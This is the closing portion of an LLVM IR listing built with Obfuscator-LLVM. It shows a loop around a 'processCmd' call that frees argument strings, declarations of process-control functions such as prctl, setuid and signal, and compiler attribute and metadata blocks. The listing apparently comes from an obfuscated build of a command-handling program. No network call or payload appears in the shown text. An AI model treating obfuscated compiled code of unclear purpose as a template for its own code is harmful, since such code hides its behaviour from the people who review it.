  %321 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i32 0, i32 0
  call void @processCmd(i32 %320, i8** %321)
  %322 = load i32, i32* %20, align 4
  %323 = icmp sgt i32 %322, 1
  br i1 %323, label %324, label %338

; <label>:324:                                    ; preds = %319
  store i32 1, i32* %22, align 4
  store i32 1, i32* %22, align 4
  br label %325

; <label>:325:                                    ; preds = %334, %324
  %326 = load i32, i32* %22, align 4
  %327 = load i32, i32* %20, align 4
  %328 = icmp slt i32 %326, %327
  br i1 %328, label %329, label %337

; <label>:329:                                    ; preds = %325
  %330 = load i32, i32* %22, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %331
  %333 = load i8*, i8** %332, align 8
  call void @free(i8* %333) #5
  br label %334

; <label>:334:                                    ; preds = %329
  %335 = load i32, i32* %22, align 4
  %336 = add nsw i32 %335, 1
  store i32 %336, i32* %22, align 4
  br label %325

; <label>:337:                                    ; preds = %325
  br label %338

; <label>:338:                                    ; preds = %337, %319
  br label %339

; <label>:339:                                    ; preds = %338, %181
  br label %85

; <label>:340:                                    ; preds = %85
  br label %341

; <label>:341:                                    ; preds = %340, %72
  ret i32 0
}

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #3

declare i32 @prctl(...) #1

declare i32 @waitpid(i32, i32*, i32) #1

; Function Attrs: nounwind
declare i32 @chdir(i8*) #3

; Function Attrs: nounwind
declare i32 @setuid(i32) #3

; Function Attrs: nounwind
declare i32 @seteuid(i32) #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

declare i32 @sleep(i32) #1

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind }
attributes #6 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readonly }
attributes #10 = { nounwind readnone }
attributes #11 = { noreturn }
attributes #12 = { noreturn nounwind }

!llvm.ident = !{!0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146520450}
!2 = !{i32 -2146519322}
!3 = !{i32 -2146518631}
!4 = !{i32 -2146517882}
!5 = !{i32 -2146516943}